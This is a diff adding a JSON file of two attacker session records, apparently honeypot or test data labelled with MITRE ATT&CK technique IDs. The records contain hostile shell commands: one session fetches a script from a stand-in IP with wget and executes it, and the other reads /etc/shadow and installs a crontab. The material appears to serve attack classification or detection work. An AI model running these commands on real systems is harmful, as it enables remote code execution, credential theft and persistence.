@@ -1,0 +1,22 @@
+[
+  {
+    "session_id": "sae-001",
+    "period": "2021-2022",
+    "src_ip": "203.0.113.8",
+    "commands": [
+      "uname -a",
+      "wget http://203.0.113.8/a.sh -O /tmp/a.sh",
+      "chmod +x /tmp/a.sh",
+      "/tmp/a.sh"
+    ],
+    "command_count": 4,
+    "session_pattern": "discovery|download|permission|execution",
+    "attack_techniques": ["T1082", "T1105", "T1222", "T1059.004"]
+  },
+  {
+    "session_id": "sae-002",
+    "period": "2024",
+    "commands": ["cat /etc/shadow", "crontab -l", "crontab /tmp/cron"],
+    "attack_techniques": [{"technique_id": "T1053.003"}]
+  }
+]
